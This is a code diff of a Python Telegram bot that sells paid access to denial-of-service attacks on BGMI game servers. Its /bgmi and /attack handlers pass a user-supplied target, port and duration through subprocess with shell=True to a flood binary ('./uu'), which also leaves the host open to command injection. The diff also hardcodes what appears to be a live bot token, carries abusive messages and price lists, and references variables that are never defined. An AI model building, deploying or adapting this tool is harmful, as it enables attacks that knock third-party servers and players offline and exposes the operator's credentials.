@@ -2,229 +2,235 @@ import telebot
 import subprocess
 import datetime
 import os
-import random
-import string
-import json
-import time
-import threading
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('8057194164:AAGyQ0Bxhvalo5bw9NOO-FFXcSrXsBuTj_w')
+
 # Admin user IDs
 admin_id = {"775750246"}
 
-# Files for data storage
-USER_FILE = "users.json"
+# File to store allowed user IDs
+USER_FILE = "users.txt"
+
+# File to store command logs
 LOG_FILE = "log.txt"
-KEY_FILE = "keys.json"
-
-# Cooldown settings
-COOLDOWN_TIME = 0  # in seconds
-CONSECUTIVE_ATTACKS_LIMIT = 2
-CONSECUTIVE_ATTACKS_COOLDOWN = 240  # in seconds
-
-# In-memory storage
-users = {}
-keys = {}
-bgmi_cooldown = {}
-consecutive_attacks = {}
-
-def load_data():
-    global users, keys
-    users = read_users()
-    keys = read_keys()
 
 def read_users():
     try:
         with open(USER_FILE, "r") as file:
-            return json.load(file)
+            return file.read().splitlines()
     except FileNotFoundError:
-        return {}
+        return []
 
-def save_users():
-    with open(USER_FILE, "w") as file:
-        json.dump(users, file)
-
-def read_keys():
+# Function to read free user IDs and their credits from the file
+def read_free_users():
     try:
-        with open(KEY_FILE, "r") as file:
-            return json.load(file)
+        with open(FREE_USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, credits = user_info
+                        free_user_credits[user_id] = int(credits)
+                    else:
+                        print(f"Ignoring invalid line in free user file: {line}")
     except FileNotFoundError:
-        return {}
+        pass
 
-def save_keys():
-    with open(KEY_FILE, "w") as file:
-        json.dump(keys, file)
+allowed_user_ids = read_users()
 
-def log_command(user_id, target, port, time_val):
+# Function to log command to the file
+def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
-    username = user_info.username if user_info.username else f"UserID: {user_id}"
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_val}\n\n")
+    if user_info.username:
+        username = "@" + user_info.username
+    else:
+        username = f"UserID: {user_id}"
+    
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
+
+# Function to clear logs
 def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
-                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
+                response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
             else:
                 file.truncate(0)
-                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
+                response = "log saaf ho gae "
     except FileNotFoundError:
-        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."
+        response = "Saaf karane ke lie koee Log nahin mila."
+    return response
 
-def record_command_logs(user_id, command, target=None, port=None, time_val=None):
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
         log_entry += f" | Target: {target}"
     if port:
         log_entry += f" | Port: {port}"
-    if time_val:
-        log_entry += f" | Time: {time_val}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
 
-def generate_key(length=6):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
+import datetime
 
-def add_time_to_current_date(hours=0, days=0):
-    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
+# Dictionary to store the approval expiry date for each user
+user_approval_expiry = {}
 
-@bot.message_handler(commands=['genkey'])
-def generate_key_command(message):
+# Function to calculate remaining approval time
+def get_remaining_approval_time(user_id):
+    expiry_date = user_approval_expiry.get(user_id)
+    if expiry_date:
+        remaining_time = expiry_date - datetime.datetime.now()
+        if remaining_time.days < 0:
+            return "Expired"
+        else:
+            return str(remaining_time)
+    else:
+        return "N/A"
+
+# Function to add or update user approval expiry date
+def set_approval_expiry_date(user_id, duration, time_unit):
+    current_time = datetime.datetime.now()
+    if time_unit == "hour" or time_unit == "hours":
+        expiry_date = current_time + datetime.timedelta(hours=duration)
+    elif time_unit == "day" or time_unit == "days":
+        expiry_date = current_time + datetime.timedelta(days=duration)
+    elif time_unit == "week" or time_unit == "weeks":
+        expiry_date = current_time + datetime.timedelta(weeks=duration)
+    elif time_unit == "month" or time_unit == "months":
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+    else:
+        return False
+    
+    user_approval_expiry[user_id] = expiry_date
+    return True
+
+# Command handler for adding a user with approval time
+@bot.message_handler(commands=['add'])
+def add_user(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
         command = message.text.split()
-        if len(command) == 3:
-            try:
-                time_amount = int(command[1])
-                time_unit = command[2].lower()
-                if time_unit == 'hours':
-                    expiration_date = add_time_to_current_date(hours=time_amount)
-                elif time_unit == 'days':
-                    expiration_date = add_time_to_current_date(days=time_amount)
-                else:
-                    raise ValueError("Invalid time unit")
-                key = generate_key()
-                keys[key] = expiration_date
-                save_keys()
-                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
-            except ValueError:
-                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
-        else:
-            response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
-    else:
-        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝐧 𝑹𝒖𝒏 𝑻𝒉𝐢𝐬 𝑪𝒐𝐦𝐦𝐚𝐧𝐝."
-    bot.reply_to(message, response)
+        if len(command) > 2:
+            user_to_add = command[1]
+            duration_str = command[2]
 
-@bot.message_handler(commands=['redeem'])
-def redeem_key_command(message):
-    user_id = str(message.chat.id)
-    command = message.text.split()
-    if len(command) == 2:
-        key = command[1]
-        if key in keys:
-            expiration_date = keys[key]
-            if user_id in users:
-                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
-                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
+            try:
+                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
+                if duration <= 0:
+                    raise ValueError
+                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
+                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
+                    raise ValueError
+            except ValueError:
+                response = "Thik se daal bsdk. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
+                bot.reply_to(message, response)
+                return
+
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                if set_approval_expiry_date(user_to_add, duration, time_unit):
+                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ."
+                else:
+                    response = "Failed to set approval expiry date. Please try again later."
             else:
-                users[user_id] = expiration_date
-            save_users()
-            del keys[key]
-            save_keys()
-            response = f"✅𝐊𝐞𝐲 𝐫𝐞𝐝𝐞𝐞𝐦𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲! 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝 𝐔𝐧𝐭𝐢𝐥𝐥: {users[user_id]}"
+                response = "User already exists ."
         else:
-            response = "𝐄𝐱𝐩𝐢𝐫𝐞 𝐊𝐞𝐘 𝐌𝐚𝐭 𝐃𝐚𝐚𝐋 𝐋𝐚𝐰𝐝𝐞 ."
+            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"
-    bot.reply_to(message, response)
+        response = "Mood ni hai abhi pelhe purchase kar isse."
 
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
+    bot.reply_to(message , response)
+
+# Command handler for retrieving user info
+@bot.message_handler(commands=['myinfo'])
+def get_user_info(message):
     user_id = str(message.chat.id)
-    if user_id in users:
-        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-        if datetime.datetime.now() > expiration_date:
-            response = "❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐨𝐓 𝐅𝐮𝐂𝐤𝐞𝐝 𝐆𝐞𝐍 𝐧𝐄𝐰 𝐊𝐞𝐘 𝐀𝐧𝐝 𝐫𝐞𝐝𝐞𝐞𝐌-> using /redeem <key> ❌"
-            bot.reply_to(message, response)
-            return
-        if user_id not in admin_id:
-            if user_id in bgmi_cooldown:
-                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
-                if time_since_last_attack < COOLDOWN_TIME:
-                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
-                    response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐚𝐰𝐝𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝  /bgmi 𝐔𝐬𝐞 𝐤𝐫𝐧𝐚."
-                    bot.reply_to(message, response)
-                    return
-                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
-                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
-                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
-                        response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐮𝐧𝐃 𝐤𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝 𝐆𝐚𝐧𝐝 𝐦𝐚𝐫𝐰𝐚 𝐥𝐞𝐧𝐚 𝐝𝐨𝐨𝐛𝐚𝐫𝐚."
-                        bot.reply_to(message, response)
-                        return
-                    else:
-                        consecutive_attacks[user_id] = 0
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1
+    user_info = bot.get_chat(user_id)
+    username = user_info.username if user_info.username else "N/A"
+    user_role = "Admin" if user_id in admin_id else "User"
+    remaining_time = get_remaining_approval_time(user_id)
+    response = f" Your Info:\n\n User ID: <code>{user_id}</code>\n Username: {username}\n Role: {user_role}\n Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n Remaining Approval Time: {remaining_time}"
+    bot.reply_to(message, response, parse_mode="HTML")
+
+
+
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
         command = message.text.split()
-        if len(command) == 4:
-            target = command[1]
-            try:
-                port = int(command[2])
-                time_val = int(command[3])
-                if time_val > 240:
-                    response = "⚠️𝐄𝐑𝐑𝐎𝐑:240 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
-                else:
-                    record_command_logs(user_id, '/bgmi', target, port, time_val)
-                    log_command(user_id, target, port, time_val)
-                    start_attack_reply(message, target, port, time_val)
-                    full_command = f"./UU  {target} {port} {time_val} 1 5 500 2"
-                    subprocess.run(full_command, shell=True)
-                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 FINISHED 🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_val} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
-            except ValueError:
-                response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user_id in allowed_user_ids:
+                        file.write(f"{user_id}\n")
+                response = f"User {user_to_remove} removed successfully ."
+            else:
+                response = f"User {user_to_remove} not found in the list ."
         else:
-            response = "𝑼𝑺𝑬 :- /𝖇𝖌𝖒𝖎  <𝐓𝐀𝐑𝐆𝐄𝐓>  <𝐏𝐎𝐑𝐓>  <𝐓𝐈𝐌𝐄>\n𝓑𝓨 @Rohan2349👑"
+            response = '''Please Specify A User ID to Remove. 
+ Usage: /remove <userid>'''
     else:
-        response = "💢 Oɴʟʏ Pᴀɪᴅ Mᴇᴍʙᴇʀs Cᴀɴ Usᴇ Tʜɪs Cᴏᴍᴍ𝐚𝐧𝐝 💢 DM  to 🗝️"
-    bot.reply_to(message, response)
+        response = "Purchase karle bsdk."
 
-def start_attack_reply(message, target, port, time_val):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝗧𝗔𝗥𝗚𝗘𝗧: {target}\n𝗣𝗢𝗥𝐓: {port}\n𝗧𝗜𝗠𝗘: {time_val} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: 𝗕𝗚𝗠𝗜\n𝙾𝚆𝙽𝙴𝚁 🚀"
     bot.reply_to(message, response)
-
+    
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        response = clear_logs()
+        try:
+            with open(LOG_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
+                else:
+                    file.truncate(0)
+                    response = "log saaf ho gae "
+        except FileNotFoundError:
+            response = "Saaf karane ke lie koee Log nahin mila ."
     else:
-        response = "𝐀𝐁𝐄 𝐆𝐀𝐍𝐃𝐔 𝐉𝐈𝐒𝐊𝐀 𝐁𝐎𝐓 𝐇 𝐖𝐀𝐇𝐈 𝐔𝐒𝐄 𝐊𝐑 𝐒𝐊𝐓𝐀 𝐄𝐒𝐄 𝐁𝐀𝐒."
+        response = "BhenChod Owner na HAI TU LODE."
     bot.reply_to(message, response)
+
+ 
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        if users:
-            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
-            for uid, expiration_date in users.items():
-                try:
-                    user_info = bot.get_chat(int(uid))
-                    username = user_info.username if user_info.username else f"UserID: {uid}"
-                    response += f"- @{username} (ID: {uid}) expires on {expiration_date}\n"
-                except Exception:
-                    response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {uid} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}\n"
-        else:
-            response = "𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚"
+        try:
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            response += f"- @{username} (ID: {user_id})\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id}\n"
+                else:
+                    response = "KOI DATA NHI HAI "
+        except FileNotFoundError:
+            response = "KOI DATA NHI HAI "
     else:
-        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐀𝐓"
+        response = "BhenChod Owner na HAI TU LODE."
     bot.reply_to(message, response)
+
 
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
@@ -235,124 +241,177 @@ def show_recent_logs(message):
                 with open(LOG_FILE, "rb") as file:
                     bot.send_document(message.chat.id, file)
             except FileNotFoundError:
-                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃."
+                response = "KOI DATA NHI HAI ."
                 bot.reply_to(message, response)
         else:
-            response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃"
+            response = "KOI DATA NHI HAI "
             bot.reply_to(message, response)
     else:
-        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐀𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"
+        response = "BhenChod Owner na HAI TU LODE."
         bot.reply_to(message, response)
+
 
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
     user_id = str(message.chat.id)
-    response = f"𝐋𝐄 𝐑𝐄 𝐋𝐔𝐍𝐃 𝐊𝐄 𝐓𝐄𝐑𝐈 𝐈𝐃: {user_id}"
+    response = f"Your ID: {user_id}"
     bot.reply_to(message, response)
 
+# Function to handle the reply when free users run the /attack
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    
+    response = f"attack start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahe Dalna Bhenchod"
+    bot.reply_to(message, response)
+
+    # Dictionary to store the last time each user ran the /attack command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME =0
+
+attack_running = False
+
+# Handler for /attack command
+@bot.message_handler(commands=['attack'])
+def handle_attack(message):
+    global attack_running
+
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        if attack_running:
+            response = "Abhi chudai Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
+            bot.reply_to(message, response)
+            return
+
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, port, and time
+            target = command[1]
+            port = int(command[2])  # Convert port to integer
+            time = int(command[3])  # Convert time to integer
+
+            if time > 180:
+                response = "Error: Time interval must be less than 180"
+            else:
+                attack_running = True  # Set the attack state to running
+                try:
+                    record_command_logs(user_id, '/attack', target, port, time)
+                    log_command(user_id, target, port, time)
+                    start_attack_reply(message, target, port, time)
+
+                    # Simulate attack process
+                    full_command = f"./uu {target} {port} {time} 1 5 500 2"
+                    subprocess.run(full_command, shell=True)
+
+                    response = "attack completed successfully feedback doo."
+                except Exception as e:
+                    response = f"Error during attack: {str(e)}"
+                finally:
+                    attack_running = False  # Reset the attack state
+        else:
+            response = "Usage: /attack <target> <port> <time>"
+    else:
+        response = "YOU CANT ATTACK. BUY KEY TO USE THIS BOT ."
+
+    bot.reply_to(message, response)
+
+
+
+
+# Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
-    if user_id in users:
+    if user_id in allowed_user_ids:
         try:
             with open(LOG_FILE, "r") as file:
                 command_logs = file.readlines()
                 user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                 if user_logs:
-                    response = "𝐋𝐞 𝐫𝐞 𝐋𝐮𝐧𝐝 𝐤𝐞 𝐘𝐞 𝐭𝐞𝐫𝐢 𝐟𝐢𝐥𝐞:\n" + "".join(user_logs)
+                    response = "Your Command Logs:\n" + "".join(user_logs)
                 else:
-                    response = "𝐔𝐒𝐄 𝐊𝐑𝐋𝐄 𝐏𝐄𝐇𝐋𝐄 𝐅𝐈𝐑 𝐍𝐈𝐊𝐀𝐋𝐔𝐍𝐆𝐀 𝐓𝐄𝐑𝐈 𝐅𝐈𝐋𝐄."
+                    response = " No Command Logs Found For You ."
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "𝐘𝐄 𝐆𝐀𝐑𝐄𝐄𝐁 𝐄𝐒𝐊𝐈 𝐌𝐀𝐊𝐈 𝐂𝐇𝐔𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐇𝐈 𝐍𝐀𝐇𝐈 𝐇 𝐄𝐒𝐊𝐄 𝐏𝐀𝐒"
+        response = "Pehle Buy krke Aao Bhenkelode ❌ ."
+
     bot.reply_to(message, response)
+
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text = '''𝐌𝐄𝐑𝐀 𝐋𝐀𝐍𝐃 𝐊𝐀𝐑𝐄 𝐇𝐄𝐋𝐏 𝐓𝐄𝐑𝐈 𝐋𝐄 𝐅𝐈𝐑 𝐁𝐇𝐈 𝐁𝐀𝐓𝐀 𝐃𝐄𝐓𝐀:
-💥 /bgmi 𝐁𝐆𝐌𝐈 𝐊𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐘𝐈.
-💥 /rules: 𝐅𝐨𝐥𝐥𝐨𝐰 𝐞𝐥𝐬𝐞 𝐑𝐚𝐩𝐞.
-💥 /mylogs: 𝐀𝐏𝐊𝐄 𝐏𝐎𝐎𝐑𝐀𝐍𝐄 𝐊𝐀𝐀𝐑𝐍𝐀𝐌𝐄 𝐉𝐀𝐍𝐍𝐄 𝐊 𝐋𝐘𝐄.
-💥 /plan: 𝐉𝐢𝐧𝐝𝐠𝐢 𝐦𝐞 𝐊𝐨𝐞 𝐏𝐋𝐀𝐍 𝐧𝐚𝐡𝐢 𝐡𝐨𝐧𝐚 𝐂𝐡𝐚𝐡𝐢𝐲𝐞.
-💥 /redeem <key>: 𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦 𝐰𝐚𝐥𝐚 𝐂𝐨𝐦𝐦𝐚𝐧𝐝.
+    help_text ='''
+💥 /attack : 😫BGMI WALO KI MAA KO attack🥵. 
+💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
+💥 /mylogs : 👁️SAB attack DEKHO👁️.
+💥 /plan : 💵SABKE BSS KA BAT HAI💵.
+💥 /myinfo : 📃APNE PLAN KI VEDHTA DEKHLE LODE📃.
 
-🤖 Admin commands:
-💥 /genkey <amount> <hours/days>: 𝐓𝐎 𝐌𝐀𝐊𝐄 𝐊𝐄𝐘.
-💥 /allusers: 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐡𝐮𝐭𝐲𝐚 𝐮𝐬𝐞𝐫𝐬.
-💥 /logs: 𝐀𝐀𝐏𝐊𝐄 𝐊𝐀𝐑𝐓𝐎𝐎𝐓𝐄 𝐉𝐀𝐍𝐍𝐄 𝐖𝐀𝐋𝐀 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.
-💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
-💥 /broadcast <message>: 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐊𝐚 𝐌𝐚𝐭𝐥𝐚𝐛 𝐓𝐨 𝐏𝐚𝐭𝐚 𝐇𝐨𝐠𝐚 𝐀𝐍𝐏𝐀𝐃.
+👀 To See Admin Commands:
+🤖 /admincmd : Shows All Admin Commands.
 '''
+    for handler in bot.message_handlers:
+        if hasattr(handler, 'commands'):
+            if message.text.startswith('/help'):
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+            elif handler.doc and 'admin' in handler.doc.lower():
+                continue
+            else:
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''𝐐 𝐫𝐞 𝐂𝐇𝐀𝐏𝐑𝐈, {user_name}! 𝐓𝐡𝐢𝐬 𝐢𝐒 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐑𝐞𝐫𝐒 𝐁𝐨𝐓 𝐒𝐞𝐫𝐯𝐢𝐜𝐞.
-🤖𝐀𝐍𝐏𝐀𝐃 𝐔𝐒𝐄 𝐇𝐄𝐋𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃: /help
-'''
+    response = f'''🔥welcome to my bot.
+🤗Try To Run This Command : /help '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐈𝐒 𝐑𝐔𝐋𝐄𝐒 𝐄𝐋𝐒𝐄 𝐘𝐎𝐔𝐑 𝐌𝐎𝐓𝐇𝐄𝐑 𝐈𝐒 𝐌𝐈𝐍𝐄:
+    response = f'''{user_name} Please Follow These Rules :
 
-1. Don't run too many attacks to avoid a ban from the bot.
-2. Don't run 2 attacks at the same time to avoid a ban from the bot.
-3. We check the logs daily, so follow these rules to avoid a ban!
-'''
+1. Dont Run Too Many attacks !! Cause A Ban From Bot
+2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
+3. MAKE SURE YOU JOINED . OTHERWISE NOT WORK
+4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 𝐆𝐀𝐑𝐄𝐄𝐁😂:
+    response = f'''{user_name}, Ye plan hi kafi hai bgmi ki ma chodne ke liye!!:
 
-VIP 🌟:
--> Attack time: 180 seconds
--> After attack limit: 5 minutes
--> Concurrent attacks: 3
+Vip  :
+->  Time :  (S)
+> After Attack Limit :10 sec
+-> Concurrents Attack : 5
 
-𝐓𝐄𝐑𝐈 𝐀𝐔𝐊𝐀𝐃 𝐒𝐄 𝐁𝐀𝐇𝐀𝐑 💸:
-𝐃𝐚𝐲: 150 𝐫𝐬
-𝐖𝐞𝐞𝐤: 600 𝐫𝐬
-𝐌𝐨𝐧𝐓𝐡: 1100 𝐫𝐬 
+Pr-ice List :
+Day-->100 Rs
+3Day-->200 Rs
+Week-->500 Rs
+Month-->1500 Rs
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
-def admin_commands(message):
+def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, 𝐋𝐞 𝐫𝐞 𝐥𝐮𝐧𝐝 𝐊𝐞 𝐘𝐞 𝐑𝐡𝐞 𝐓𝐞𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝:
+    response = f'''{user_name}, Admin Commands Are Here!!:
 
-💥 /genkey 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐚 𝐤𝐞𝐲.
-💥 /allusers: 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐡𝐮𝐭𝐲𝐚 𝐮𝐬𝐞𝐫𝐬.
-💥 /logs: 𝐒𝐡𝐨𝐰 𝐥𝐨𝐠𝐬 𝐟𝐢𝐥𝐞.
-💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
-💥 /broadcast <message>: 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.
+➕ /add <userId> : Add a User.
+🖕 /remove <userid> Remove a User.
+📒 /allusers : Authorised Users Lists.
+📃 /logs : All Users Logs.
+ /broadcast : Broadcast a Message.
+ /clearlogs : Clear The Logs File.
+ /clearusers : Clear The USERS File.
 '''
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) == 2:
-            target_user_id = command[1]
-            if target_user_id in users:
-                del users[target_user_id]
-                save_users()
-                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃."
-            else:
-                response = "𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂"
-        else:
-            response = "Usage: /remove <user_id>"
-    else:
